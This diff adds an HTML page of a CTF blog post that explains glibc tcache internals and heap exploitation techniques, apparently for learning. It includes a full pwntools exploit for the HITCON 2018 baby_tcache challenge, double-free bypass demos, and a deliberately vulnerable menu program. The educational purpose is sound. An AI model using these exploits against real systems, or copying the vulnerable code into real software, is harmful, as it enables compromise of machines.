@@ -1,0 +1,892 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Tcache Summary | kotori的菜园</title>
+<link rel="shortcut icon" href="https://kotoriseed.github.io//favicon.ico?v=1718591155332">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://kotoriseed.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Tcache Summary | kotori的菜园 - Atom Feed" href="https://kotoriseed.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-PJDEM99E9P"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-PJDEM99E9P');
+</script>
+
+
+    <meta name="description" content="tcache bin概述
+在libc2.26及之后，glibc引入了tcache机制，目的是为了使多线程下的堆分配有更高的效率。
+libc2.26
+最初版本的tcache引入了这两个结构体
+/* We overlay this struct..." />
+    <meta name="keywords" content="tricks" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://kotoriseed.github.io/">
+  <img class="avatar" src="https://kotoriseed.github.io//images/avatar.png?v=1718591155332" alt="">
+  </a>
+  <h1 class="site-title">
+    kotori的菜园
+  </h1>
+  <p class="site-description">
+    挑战者贵为永恒黄金
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Tcache Summary
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-04-11
+              </span>
+              <span>
+                21 min read
+              </span>
+              
+                <a href="https://kotoriseed.github.io/tag/lEdq9BfNl/" class="post-tag">
+                  # tricks
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="tcache-bin概述">tcache bin概述</h1>
+<p>在libc2.26及之后，glibc引入了tcache机制，目的是为了使多线程下的堆分配有更高的效率。</p>
+<h2 id="libc226">libc2.26</h2>
+<p>最初版本的tcache引入了这两个结构体</p>
+<pre><code class="language-c">/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */
+typedef struct tcache_entry
+{
+  struct tcache_entry *next;
+} tcache_entry;
+</code></pre>
+<pre><code class="language-c">/* There is one of these for each thread, which contains the per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */
+typedef struct tcache_perthread_struct
+{
+  char counts[TCACHE_MAX_BINS];
+  tcache_entry *entries[TCACHE_MAX_BINS];
+} tcache_perthread_struct;
+
+static __thread tcache_perthread_struct *tcache = NULL;
+</code></pre>
+<p>从以上部分可以看出，他是类似于fastbin的一种单链表结构。</p>
+<p>除此之外，还有两个重要函数：</p>
+<pre><code class="language-c">static void
+tcache_put (mchunkptr chunk, size_t tc_idx)
+{
+  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
+  assert (tc_idx &lt; TCACHE_MAX_BINS);
+  e-&gt;next = tcache-&gt;entries[tc_idx];
+  tcache-&gt;entries[tc_idx] = e;
+  ++(tcache-&gt;counts[tc_idx]);
+}
+</code></pre>
+<p>tcache_put会在_int_free函数的开头被调用，尝试将对应freed chunk优先放入tcache bin中。</p>
+<p>因为有<code>TCACHE_MAX_BINS</code>的限制（类似于fastbin的global_max_fast去限制fastbinsY数组），0x400及以上的chunk并不会放入tcache bin。</p>
+<p>并且每条单链表上最多有<code>mp_.tcache_count</code>个chunk，该值默认为7。</p>
+<p>而且这里应该注意，<code>tcache_entry *e = (tcache_entry *) chunk2mem(chunk);</code>这里调用了<code>chunk2mem</code>这个宏，所以tcache链表串起来的是对应chunk的userdata的位置。</p>
+<pre><code class="language-c">static void *
+tcache_get (size_t tc_idx)
+{
+  tcache_entry *e = tcache-&gt;entries[tc_idx];
+  assert (tc_idx &lt; TCACHE_MAX_BINS);
+  assert (tcache-&gt;entries[tc_idx] &gt; 0);
+  tcache-&gt;entries[tc_idx] = e-&gt;next;
+  --(tcache-&gt;counts[tc_idx]);
+  return (void *) e;
+}
+</code></pre>
+<p>tcache_get会在_int_malloc的开头被调用，尝试从tcache bin里面拿对应的chunk。</p>
+<p>这里给出一个demo程序来简单看一下tcache：</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/11/19ced7ff2ef6a.png" alt="1649643869341.png" loading="lazy"></figure>
+<p>编译语句：</p>
+<p><code>gcc -o demo ./demo.c -no-pie</code></p>
+<p>在puts处下断点，查看bins情况</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/11/2284e4266cb01.png" alt="1649643939368.png" loading="lazy"></figure>
+<p>可以看到，0x30和0x40的tcache bin被放入了7个chunk的时候，再次free这两个size的chunk，都进到了fastbin里面。</p>
+<h2 id="libc229">libc2.29+</h2>
+<p>(注：在2.27的高版本同样也具有相关检测)</p>
+<p>在libc2.29之后，tcacbe_entry结构体中加入了一个key指针</p>
+<pre><code class="language-c">typedef struct tcache_entry
+{
+  struct tcache_entry *next;
+  /* This field exists to detect double frees.  */
+  struct tcache_perthread_struct *key;
+} tcache_entry;
+</code></pre>
+<p>next对应了malloc_chunk中的fd那个位置，key对应了bk的位置。</p>
+<p>tcache_put函数针对key有了相关的更新：</p>
+<pre><code class="language-c">static __always_inline void
+tcache_put(mchunkptr chunk, size_t tc_idx)
+{
+  tcache_entry *e = (tcache_entry *)chunk2mem(chunk);
+ 
+  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will
+     detect a double free.  */
+  e-&gt;key = tcache;
+ 
+  e-&gt;next = tcache-&gt;entries[tc_idx];
+  tcache-&gt;entries[tc_idx] = e;  
+ 
+  ++(tcache-&gt;counts[tc_idx]);
+}
+</code></pre>
+<p>由于这个key的加入，tcachebin的double free检测有了更新：</p>
+<pre><code class="language-c">    size_t tc_idx = csize2tidx(size);
+
+    if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)
+    {
+      /* Check to see if it's already in the tcache.  */
+      tcache_entry *e = (tcache_entry *)chunk2mem(p);
+ 
+      if (__glibc_unlikely(e-&gt;key == tcache))
+      {
+        tcache_entry *tmp;
+        LIBC_PROBE(memory_tcache_double_free, 2, e, tc_idx);  //这里会以一定的概率去遍历链表
+        for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)
+          if (tmp == e)
+            malloc_printerr(&quot;free(): double free detected in tcache 2&quot;);
+      }
+ 
+      if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)
+      {
+        tcache_put(p, tc_idx);
+        return;
+      }
+    }
+</code></pre>
+<p>这里只是初步过一遍，后面会结合对应版本的源码讲具体攻击手法。</p>
+<h1 id="攻击手法">攻击手法</h1>
+<p>在tcache机制加入的初期，问题其实是非常多的，他的安全性甚至还不如fastbin，这就导致了非常多的利用可以轻易达成。</p>
+<h2 id="tcache-poisoning">tcache poisoning</h2>
+<h3 id="介绍">介绍</h3>
+<p>类似于fastbin attack，不过目前的tcache并没有检查next指向的chunk的size是否合法，所以直接伪造next指针为想要修改的地址就好了。</p>
+<p>这里在libc2.27下做一个演示</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/11/aa2d1671f656d.png" alt="1649681099461.png" loading="lazy"></figure>
+<p>注：在hijack b的next指针之前，先free掉了一个相同大小的chunk，这是因为在该版本下有一个检查，</p>
+<p><code>assert (tcache-&gt;counts[tc_idx] &gt; 0);</code></p>
+<p>运行结果如下</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/11/891b43bfd3fef.png" alt="1649681310368.png" loading="lazy"></figure>
+<h3 id="tcache-poisoning-at-234">tcache poisoning at 2.34+</h3>
+<p>在2.34以及之后的版本中，libc对fastbin和tcache bin的fd指针位置进行了宏操作来保护地址</p>
+<pre><code class="language-c">/* Safe-Linking:
+   Use randomness from ASLR (mmap_base) to protect single-linked lists
+   of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the
+   lists' chunks, and also perform allocation alignment checks on them.
+   This mechanism reduces the risk of pointer hijacking, as was done with
+   Safe-Unlinking in the double-linked lists of Small-Bins.
+   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with
+   larger pages provide less entropy, although the pointer mangling
+   still works.  */
+#define PROTECT_PTR(pos, ptr) \
+  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))
+#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)
+</code></pre>
+<p>劫持方法并没有太大的改变，这一部分手动分析即可。</p>
+<p>（例题参考：<a href="https://kotoriseed.github.io/post/bytectf2022/#mini_http2">ByteCTF-2022 mini_http2</a>）</p>
+<h3 id="例题">例题</h3>
+<h4 id="hitcon-2018-baby_tcache">HITCON 2018 baby_tcache</h4>
+<p>环境是libc2.27的，保护全开。（为了方便本地演示，调试时关掉了本机的ALSR）</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/11/ab281dd438446.png" alt="1649681765795.png" loading="lazy"></figure>
+<p>主菜单只有两个功能，创建堆和释放堆，并没有可以用来leak信息的show功能。</p>
+<p>漏洞非常直白：</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/11/697c36172b6f0.png" alt="1649681833747.png" loading="lazy"></figure>
+<p>在read结束过后有一个off by null。</p>
+<p>由于没有可以用于leak的函数，这里会用到一个IO_FILE的技巧：劫持 <code>_IO_2_1_stdout_</code></p>
+<p>虽然程序一开始用setbuf关闭了缓冲区， 但我们还是可以修改<code>_IO_2_1_stdout_</code>的_flags成员来让程序误以为存在缓冲。</p>
+<p>因为程序调用了大量的puts函数，而puts会调用<code>_IO_new_file_xsputn</code>--&gt; <code>_IO_new_file_overflow</code></p>
+<p>--&gt;<code>_IO_do_write</code></p>
+<pre><code class="language-c">int
+_IO_new_file_overflow (_IO_FILE *f, int ch)
+{
+  if (f-&gt;_flags &amp; _IO_NO_WRITES) 
+    {
+      f-&gt;_flags |= _IO_ERR_SEEN;
+      __set_errno (EBADF);
+      return EOF;
+    }
+  /* If currently reading or no buffer allocated. */
+  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL) 
+    {
+      :
+      :
+    }
+  if (ch == EOF)
+    return _IO_do_write (f, f-&gt;_IO_write_base,
+             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);
+</code></pre>
+<pre><code class="language-c">static
+_IO_size_t
+new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
+{
+  _IO_size_t count;
+  if (fp-&gt;_flags &amp; _IO_IS_APPENDING)
+    /* On a system without a proper O_APPEND implementation,
+       you would need to sys_seek(0, SEEK_END) here, but is
+       not needed nor desirable for Unix- or Posix-like systems.
+       Instead, just indicate that offset (before and after) is
+       unpredictable. */
+    fp-&gt;_offset = _IO_pos_BAD;
+  else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)
+    {
+     ............
+    }
+  count = _IO_SYSWRITE (fp, data, to_do);
+</code></pre>
+<p>总的来说，要使程序认为stdout仍具有缓冲区，需要满足：</p>
+<ul>
+<li>!(f-&gt;_flags &amp; _IO_NO_WRITES)</li>
+<li>f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING</li>
+<li>fp-&gt;_flags &amp; _IO_IS_APPENDING</li>
+</ul>
+<p>即：</p>
+<pre><code>_flags = 0xfbad0000  // Magic number
+_flags &amp; = ~_IO_NO_WRITES // _flags = 0xfbad0000
+_flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800
+_flags | = _IO_IS_APPENDING // _flags = 0xfbad1800
+</code></pre>
+<p>_flags满足过后，就会输出<code>_IO_2_1_stdout_</code>中<code>_IO_write_base</code>到<code>_IO_write_ptr</code>之间的内容。</p>
+<p>leak的思路有了之后，先构造overlap chunk，</p>
+<pre><code class="language-python">create(0x4f0) # 0
+create(0x30) # 1 # 多用几个tcache范围内不同的size，方便free的时候能精准指向目标
+create(0x40) # 2
+create(0x50) # 3
+create(0x60) # 4 # 用于取消下一个chunk的prev_inuse bit，触发unlink
+create(0x4f0) # 5
+create(0x60, p64(0xdeadbeef)) # 6 # 防止和top chunk合并
+delete(4)
+pay = b'a'*0x60 + p64(0x660) # prev_size指向chunk 0
+create(0x68, pay) # 4
+delete(1) # 准备进行tcache poisoning
+delete(0) # 使合并的对象能绕过unlink检查
+delete(5) # 触发合并
+</code></pre>
+<p>接着free掉chunk 4（其实chunk2和chunk3也行），为接下来拿到libcbase之后劫持__free_hook做准备。</p>
+<p>然后申请0x500的chunk，切割unsortedbin，使之前free掉的chunk 1处的next指针指向一个main_arena的地址</p>
+<p>再申请一个chunk进行低字节爆破，有1/16的几率将next指针挂到_IO_2_1_stdout _。</p>
+<pre><code class="language-python">create(0x4f0) # 0
+delete(4) # ready to hijack __free_hook
+create(0xe0, '\x60\x07') # 4
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/11/4b562aca3760f.png" alt="1649683696008.png" loading="lazy"></figure>
+<p>malloc到<code>_IO_2_1_stdout_</code>，改写<code>_flags</code>，<code>_IO_write_base</code>和完成tcache poisoning</p>
+<pre><code class="language-python">create(0x30)
+pay = p64(0xfbad1800) + p64(0)*3 + b'\x00'
+create(0x30, pay)
+</code></pre>
+<p>然后menu函数会调用puts，缓冲区被输出，leak到libc基址</p>
+<p>接下来再tcache poisoning将one_gadget写进__free_hook，getshell。</p>
+<p>完整exp:</p>
+<pre><code class="language-python">from pwn import *
+context.log_level = 'debug'
+elf = ELF('./baby_tcache')
+libc = ELF('./libc-2.27.so')
+p = process('./baby_tcache')
+
+def choice(idx):
+	p.recvuntil('choice:')
+	p.sendline(str(idx))
+
+def create(sz, content='A'):
+	choice(1)
+	p.recvuntil('Size:')
+	p.sendline(str(sz))
+	p.recvuntil('Data:')
+	p.send(content)
+
+def delete(idx):
+	choice(2)
+	p.recvuntil('Index:')
+	p.sendline(str(idx))
+
+create(0x4f0) # 0
+create(0x30) # 1
+create(0x40) # 2
+create(0x50) # 3
+create(0x60) # 4
+create(0x4f0) # 5
+create(0x60, p64(0xdeadbeef)) # 6
+delete(4)
+pay = b'a'*0x60 + p64(0x660)
+create(0x68, pay) # 4
+delete(1) # ready to f**k _IO_2_1_stdout_
+delete(0)
+delete(5)
+create(0x4f0) # 0
+delete(4) # ready to hijack __free_hook
+create(0xe0, '\x60\x07') # 4
+# tcache poisoning
+create(0x30)
+pay = p64(0xfbad1800) + p64(0)*3 + b'\x00'
+create(0x30, pay)
+p.recv(8)
+libcbase = u64(p.recv(8)) - 0x3ed8b0
+hook = libcbase + libc.symbols['__free_hook']
+print(hex(libcbase))
+
+one = [0x4f2c5, 0x4f322, 0x10a38c]
+create(0xf0, p64(hook))
+create(0x60)
+create(0x60, p64(libcbase + one[1]))
+
+delete(4)
+
+# gdb.attach(p)
+
+p.interactive()
+</code></pre>
+<h2 id="double-free">double free</h2>
+<h3 id="介绍-2">介绍</h3>
+<h4 id="在libc226下">在libc2.26下：</h4>
+<p>此时的tcache根本不会检查，直接free(a), free(a)都可以成功。</p>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/11/9159398c88595.png" alt="1649676692836.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/11/faa09f83b56e5.png" alt="1649676668354.png" loading="lazy"></figure>
+<h4 id="在libc229下">在libc2.29+下：</h4>
+<p>由于加入了以下检查：</p>
+<pre><code class="language-c"> if (__glibc_unlikely(e-&gt;key == tcache))
+      {
+        tcache_entry *tmp;
+        LIBC_PROBE(memory_tcache_double_free, 2, e, tc_idx);  //这里大概率会去遍历链表
+        for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)
+          if (tmp == e)
+            malloc_printerr(&quot;free(): double free detected in tcache 2&quot;);
+      }
+</code></pre>
+<p>之前的直接free两次的手法就失效了，但是我们可以先将tcachebin填满，然后将问题转化为fastbin中的double free，抑或是阅读源码，另寻突破口。</p>
+<h4 id="tcache-stash-on-fastbin">Tcache Stash on Fastbin</h4>
+<p>tcache的stash机制，简单来说就是，在从fastbin和small bin中取chunk的时候，会尽可能的把剩余的其他chunk也一起放入tcache bin中。对于stash机制在small bin中的应用，接下来会单独讲解。这里仅讨论在fastbin中的应用。</p>
+<p>本地写了一个demo程序，libc版本是2.31</p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/11/02f6be83f5ab2.png" alt="1649687707879.png" loading="lazy"></figure>
+<p>首先用7个chunk填满tcache的某一位，然后再开两个chunk放入fastbin中，接下来free ABA构成double free。</p>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/11/0d69555dca3eb.png" alt="1649687568322.png" loading="lazy"></figure>
+<p>然后拿走7个tcache中的chunk，拿到fastbin中的第一个A，将fd改成目标地址，然后此时会触发stash机制，将chunkB和第二个A，以及他指向的目标一起放进tcache中，达成申请到任意地址的效果。</p>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/11/9aa99dda132bd.png" alt="1649687625746.png" loading="lazy"></figure>
+<h4 id="bypass-double-free-check">bypass double free check</h4>
+<p>如果不存在calloc的话，那么上面那个手法就很难实现了，这时不妨再分析一下源码，另寻突破口。</p>
+<p>在<code>tcache_put</code>中，对每一个进入tcache bin的chunk的bk处赋予了一个特定值</p>
+<pre><code class="language-c">static __always_inline void
+tcache_put (mchunkptr chunk, size_t tc_idx)
+{
+  ......
+  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
+
+  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will
+     detect a double free.  */
+  e-&gt;key = tcache;
+  ......
+}
+</code></pre>
+<p>在<code>_int_free</code>中进行了相关检查</p>
+<pre><code class="language-c">#if USE_TCACHE
+  {
+    size_t tc_idx = csize2tidx (size);
+    if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)
+      {
+	/* Check to see if it's already in the tcache.  */
+	tcache_entry *e = (tcache_entry *) chunk2mem (p);
+
+	/* This test succeeds on double free.  However, we don't 100%
+	   trust it (it also matches random payload data at a 1 in
+	   2^&lt;size_t&gt; chance), so verify it's not an unlikely
+	   coincidence before aborting.  */
+	if (__glibc_unlikely (e-&gt;key == tcache))
+	  {
+	    tcache_entry *tmp;
+	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
+	    for (tmp = tcache-&gt;entries[tc_idx];
+		 tmp;
+		 tmp = tmp-&gt;next)
+	      if (tmp == e)
+		malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);
+	    /* If we get here, it was a coincidence.  We've wasted a
+	       few cycles, but don't abort.  */
+	  }
+
+	if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)
+	  {
+	    tcache_put (p, tc_idx);
+	    return;
+	  }
+      }
+  }
+#endif
+</code></pre>
+<p>稍微总结一下，会发现以下几种利用方式：</p>
+<ul>
+<li>很明显, 进入遍历检查的条件是<code>__glibc_unlikely (e-&gt;key == tcache)</code>, 如果让<code>e-&gt;key != tcache</code>, 是不是就可以很轻松的bypass这个检测了。</li>
+</ul>
+<ol start="2">
+<li>如果有办法修改到该chunk的size，让计算出来的<code>tc_idx</code>发生变化，就能让后续的检查变成在别的entries上遍历, 这样也能成功绕过。</li>
+</ol>
+<ul>
+<li>对<code>e-&gt;key</code>的赋值操作是<code>tcache_put</code>完成的，那么如果我让一个chunk在被free的时候不进入tcache bin，反手进入unsortedbin，然后再使用相关的风水操作，最后利用uaf对目标chunk再次free，也能成功绕过检测。这就是house of botcake手法的思想。</li>
+</ul>
+<h5 id="劫持key">劫持key</h5>
+<p>将原本的key破坏掉，即可绕过遍历检查</p>
+<h6 id="demo01c">demo01.c</h6>
+<pre><code class="language-c">#include&lt;unistd.h&gt;
+#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+
+int main(){
+	intptr_t ptr = malloc(0x100);
+	free(ptr);
+
+	*((intptr_t *)ptr+1) = 0;
+
+	free(ptr);
+
+	getchar();
+
+	return 0;
+}
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/10/24/889f5d657554f.png" alt="1666618469179.png" loading="lazy"></figure>
+<h5 id="劫持chunk-size">劫持chunk size</h5>
+<p>改掉chunk size让算出来的<code>tc_idx</code>和原来不一致，从而进入别的链表遍历</p>
+<h6 id="demo02c">demo02.c</h6>
+<pre><code class="language-c">#include&lt;unistd.h&gt;
+#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+
+int main(){
+	intptr_t ptr = malloc(0x100);
+	free(ptr);
+
+	*((intptr_t *)ptr-1) = 0xf0;
+
+	free(ptr);
+
+	getchar();
+
+	return 0;
+}
+</code></pre>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/10/24/4a9f6325b6bc8.png" alt="1666618668266.png" loading="lazy"></figure>
+<h5 id="house-of-botcake">house of botcake</h5>
+<p>条件：能够申请到可以进入unsorted bin和tcache bin的chunk（&gt;0x90）</p>
+<ol>
+<li>首先将7个chunk放入tcache bin, 然后再将两个chunk（A， B）放入unsorted bin（让他们合并）。</li>
+<li>此时从tcache bin取出一个chunk给接下来的double free腾位置。</li>
+<li>这个时候free掉位置靠近top chunk的chunk A, 它就会进入tcache bin。</li>
+<li>申请一个略微大于chunk A的size的chunk, 从unsorted bin中切割出来, 此时就会和tcache中的chunk A重叠。</li>
+</ol>
+<h6 id="demo03c">demo03.c</h6>
+<pre><code class="language-c">#include&lt;unistd.h&gt;
+#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+
+int main(){
+	intptr_t *ptr[7], chunk_A, chunk_B, chunk_C;
+
+	for(int i=0;i&lt;7;i++)  ptr[i] = malloc(0x100);
+	chunk_B = malloc(0x100);
+	chunk_A = malloc(0x100);
+	malloc(0x20);  // gap
+
+	for(int i=0;i&lt;7;i++)  free(ptr[i]);
+	free(chunk_A);
+	free(chunk_B); // consolidate
+
+	malloc(0x100);
+
+	free(chunk_A); // double free
+
+	chunk_C = malloc(0x110);
+	*((intptr_t *)chunk_C+0x22) = 0xdeadbeef;
+
+	getchar();
+
+	return 0;
+}
+</code></pre>
+<figure data-type="image" tabindex="15"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/10/24/98a187e790f84.png" alt="1666617015457.png" loading="lazy"></figure>
+<p>（值得一提的是，用于劫持tcache上指针的<code>chunk_C</code>和被double free的<code>chunk_A</code>是可以反复利用的，所以该trick可以轻松达成多次任意地址申请）</p>
+<p>（例题可以找<strong>ciscn_2022华东北赛区-Blue</strong>来练手）</p>
+<h2 id="tcache-stashing-unlink-attack">tcache stashing unlink attack</h2>
+<p>接下来的trick比较有意思，在libc 2.29+使用也较为广泛</p>
+<p>以下为示范漏洞程序（ubuntu20.04）</p>
+<pre><code class="language-c">#include&lt;unistd.h&gt;
+#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+void *ptr[0x10];
+int idx;
+void init(){
+	setbuf(stdin, 0);
+	setbuf(stdout, 0);
+	setbuf(stderr, 0);
+}
+int menu(){
+	puts(&quot;1.create&quot;);
+	puts(&quot;2.edit&quot;);
+	puts(&quot;3.show&quot;);
+	puts(&quot;4.delete&quot;);
+	puts(&quot;5.exit&quot;);
+	return puts(&quot;Your choice:&quot;);
+}
+int readInt(){
+	char buf[0x10];
+	read(0, buf, 8);
+	return atoi(buf);
+}
+void create(){
+	int idx, ini;
+	size_t sz;
+	puts(&quot;Index:&quot;);
+	idx = readInt();
+	puts(&quot;Size:&quot;);
+	sz = readInt();
+	puts(&quot;Initialize?&quot;);
+	ini = readInt();
+	if(ini)
+		ptr[idx] = calloc(1, sz);
+	else
+		ptr[idx] = malloc(sz);
+	if(!ptr[idx]){
+		fprintf(stderr, &quot;alloc error!\n&quot;);
+		exit(-1);
+	}
+	puts(&quot;d0ne!&quot;);
+}
+void edit(){
+	int idx, sz;
+	puts(&quot;Index:&quot;);
+	idx = readInt();
+	puts(&quot;Size:&quot;);
+	sz = readInt();
+	read(0, ptr[idx], sz);
+	puts(&quot;d0ne!&quot;);
+}
+void show(){
+	puts(&quot;Index:&quot;);
+	int idx = readInt();
+	if(!ptr[idx]){
+		puts(&quot;error index!&quot;);
+		return;
+	}
+	puts(ptr[idx]);
+}
+void del(){
+	puts(&quot;Index:&quot;);
+	int idx = readInt();
+	if(!ptr[idx]){
+		puts(&quot;error index!&quot;);
+		return;
+	}
+	free(ptr[idx]);
+}
+int main(){
+	init();
+	while(1){
+		menu();
+		int op = readInt();
+		switch(op){
+		case 1:
+			create();  break;
+		case 2:
+			edit();  break;
+		case 3:
+			show();  break;
+		case 4:
+			del();  break;
+		case 5:
+			exit(0);
+			break;
+		default:  break;
+		}
+	}
+	return 0;
+}
+</code></pre>
+<p>编译语句：</p>
+<pre><code>gcc heap.c -o heap -g -z relro -z lazy
+</code></pre>
+<p>洞十分多，uaf，堆溢出等等，而且可以任意调用calloc和malloc。</p>
+<h3 id="原理">原理</h3>
+<p>之前介绍了tcache的stash机制在fastbin下的利用，简单的说就是在fastbin拿到chunk的时候会尽可能将剩下的chunks往tcache里面塞。</p>
+<p>对于smallbin的情况也类似，在从smallbin取chunk的时候也会将剩下的chunk尽可能的丢进tcache。但是需要先绕过smallbin在解链的时候的检查。（bck-&gt;fd = victim &amp;&amp; fwd-&gt;bk = victim）</p>
+<h3 id="效果">效果</h3>
+<ul>
+<li>
+<p>tcache stashing unlink attack可以做到将任意地址改写为一个main_arena上的地址（类似于之前的unsorted bin attack）</p>
+</li>
+<li>
+<p>如果可以保证目标地址+0x8处指向一个可写的地址，那么还可以实现任意地址写。</p>
+</li>
+<li>
+<p>目标地址+0x8指向的任意地址如果可控，就能同时实现上述两个效果</p>
+</li>
+</ul>
+<h3 id="例子">例子</h3>
+<h4 id="tcache-stashing-unlink-attack-2">tcache stashing unlink attack</h4>
+<p>先将某一个size的tcache填到6个，然后再将两个chunk放入对应size的smallbin。</p>
+<figure data-type="image" tabindex="16"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/27/27b3abdbd1438.png" alt="1651064602225.png" loading="lazy"></figure>
+<p>因为smallbin是FIFO的，这个时候拿走先放入smallbin的那个chunk过后，size为0x70的tcache还有一个空位，会尝试将我们后放入smallbin的那个chunk放入tcache中。</p>
+<p>此时会有以下流程：</p>
+<pre><code class="language-c">#if USE_TCACHE
+      /* While we're here, if we see other chunks of the same size,
+         stash them in the tcache.  */
+      size_t tc_idx = csize2tidx (nb);
+      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)
+        {
+          mchunkptr tc_victim;
+          /* While bin not empty and tcache not full, copy chunks over.  */
+          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count
+             &amp;&amp; (tc_victim = last (bin)) != bin)
+        {
+          if (tc_victim != 0)
+            {
+              bck = tc_victim-&gt;bk;
+              set_inuse_bit_at_offset (tc_victim, nb);
+              if (av != &amp;main_arena)
+            set_non_main_arena (tc_victim);
+              bin-&gt;bk = bck;
+              bck-&gt;fd = bin;
+              tcache_put (tc_victim, tc_idx);
+                }
+        }
+</code></pre>
+<p>由于这个stash过程没有任何检查，所以只需要伪造后放入smallbin的那个chunk的bk为目标地址-0x10，由<code>bck-&gt;fd = bin</code>实现目标。</p>
+<p>但是在前一个chunk解链时会检查双向链表的完整性，所以需要保证后面那个chunk的fd不变。</p>
+<figure data-type="image" tabindex="17"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/27/c7f732b4c49cd.png" alt="1651065089684.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="18"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/27/b14e6aa072d97.png" alt="1651065364560.png" loading="lazy"></figure>
+<p>此时用calloc从0x70的smallbin里拿一个chunk之后，触发stash，将剩下的chunk放进tcache，成功实现攻击</p>
+<figure data-type="image" tabindex="19"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/27/7d64506994f74.png" alt="1651065392625.png" loading="lazy"></figure>
